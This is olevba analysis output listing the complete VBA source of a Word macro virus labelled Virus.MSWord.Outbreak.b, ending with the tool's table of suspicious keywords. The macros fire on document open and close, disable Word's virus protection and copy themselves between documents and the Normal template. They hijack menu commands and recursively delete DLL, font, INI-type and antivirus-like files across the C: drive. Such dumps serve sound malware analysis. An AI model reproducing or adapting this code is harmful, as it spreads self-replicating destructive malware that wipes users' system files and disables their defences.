olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Outbreak.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Outbreak.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OutBreak.bas 
in file: Virus.MSWord.Outbreak.b - OLE stream: 'Macros/VBA/OutBreak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "¥¨¶°«Ø¥ß©ó 98/??/??¡A«Ø¥ßªÌ OutBreak"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.OutBreak.AutoClose"

Dim EPOLA
On Error Resume Next


Options.VirusProtection = _
False
Set activedoc = _
ActiveDocument
Set GlobalDoc = _
NormalTemplate
   

 Application.OrganizerCopy Source:=NormalTemplate.FullName, _
 Destination:=ActiveDocument.FullName, Name:="OutBreak", _
 Object:=wdOrganizerObjectProjectItems
 activedoc.SaveAs , fileformat:=wdFormatTemplate
 Options.SavePropertiesPrompt = False
   
   
 Application.OrganizerCopy Source:=ActiveDocument.FullName, _
 Destination:=NormalTemplate.FullName, Name:="OutBreak", _
 Object:=wdOrganizerObjectProjectItems
 Options.SaveNormalPrompt = False


EPOLA = _
Int(Rnd() * 20) + 1
If EPOLA > 18 Then
WordBasic.Call "VIRUS"
WordBasic.Call "VIRUS2"
End If
exit_:

End Sub
Sub AutoExec()
Dim Wri$
On Error Resume Next

Open "c:\command.log" For Input As 1
Input #1, Wri$
Close 1

If Wri$ = "MoTaBa-J" Then
WordBasic.Call "VIRUS1"
WordBasic.Call "VIRUS3"
End If

If Wri$ = "" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-A"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-A" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-B"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-B" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-C"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-C" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-D"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-D" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-E"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-E" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-F"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-F" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-G"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-G" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-H"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-H" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-I"
Close 1
GoTo exit_
End If

If Wri$ = "MoTaBa-I" Then
Open "c:\command.log" For Output As 1
Print #1, "MoTaBa-J"
Close 1
GoTo exit_
End If

exit_:

End Sub
Sub AutoOpen()
   
WordBasic.Call "VIRUS4"
WordBasic.Call "VIRUS5"
   
Options.VirusProtection = _
False
Set activedoc = _
ActiveDocument
Set GlobalDoc = _
NormalTemplate
     
 Application.OrganizerCopy Source:=ActiveDocument.FullName, _
 Destination:=NormalTemplate.FullName, Name:="OutBreak", _
 Object:=wdOrganizerObjectProjectItems
 Options.SaveNormalPrompt = False

exit_:
End Sub
Sub FileTemplates()
AutoExec
Rem OutBreak
End Sub
Sub ViewVBCode()
AutoExec
Rem OutBreak
End Sub
Sub ToolsCustomize()
Rem OutBreak
End Sub
Sub ToolsOptions()
Rem OutBreak
End Sub
Sub ToolsMacro()
AutoExec
Rem OutBreak
End Sub
Sub VIRUS()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.in?"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With

End Sub
Sub VIRUS1()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.ttf"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
End Sub
Sub VIRUS2()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.dll"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
End Sub
Sub VIRUS3()
On Error Resume Next

 With Application.FileSearch
        .Filename = "*.v??"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
End Sub
Sub VIRUS4()
Dim scan$
On Error Resume Next

Open "c:\config.vir" For Input As 1
Input #1, scan$
Close 1

If scan$ = "MoTaBa-D" Then
GoTo exit_
End If


If scan$ = "" Then
Open "c:\config.vir" For Output As 1
Print #1, "MoTaBa-A"
Close 1
End If

On Error Resume Next

 With Application.FileSearch
        .Filename = "?scan.*"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
Open "c:\config.vir" For Input As 1
Input #1, scan$
Close 1
    
If scan$ = "MoTaBa-A" Then
Open "c:\config.vir" For Output As 1
Print #1, "MoTaBa-B"
Close 1
GoTo exit_
End If

exit_:


End Sub
Sub VIRUS5()
Dim scan$
On Error Resume Next

Open "c:\config.vir" For Input As 1
Input #1, scan$
Close 1

If scan$ = "MoTaBa-D" Then
GoTo exit_
End If


If scan$ = "MoTaBa-B" Then
Open "c:\config.vir" For Output As 1
Print #1, "MoTaBa-C"
Close 1
End If

On Error Resume Next

 With Application.FileSearch
        .Filename = "?scan.*"
        .LookIn = "C:\"
        .SearchSubFolders = True
        .Execute
        If .FoundFiles.count <> 0 Then
            For I = 1 To .FoundFiles.count
            Kill .FoundFiles(I)
            'Beep
            Next I
        End If
    End With
    
Open "c:\config.vir" For Input As 1
Input #1, scan$
Close 1
    
If scan$ = "MoTaBa-C" Then
Open "c:\config.vir" For Output As 1
Print #1, "MoTaBa-D"
Close 1
End If

exit_:

End Sub
Sub FileSave()
On Error GoTo exit_:
WordBasic.FileSave
AutoClose
exit_:
End Sub
Sub FileSaveAs()
On Error GoTo exit_:
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
AutoClose
exit_:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

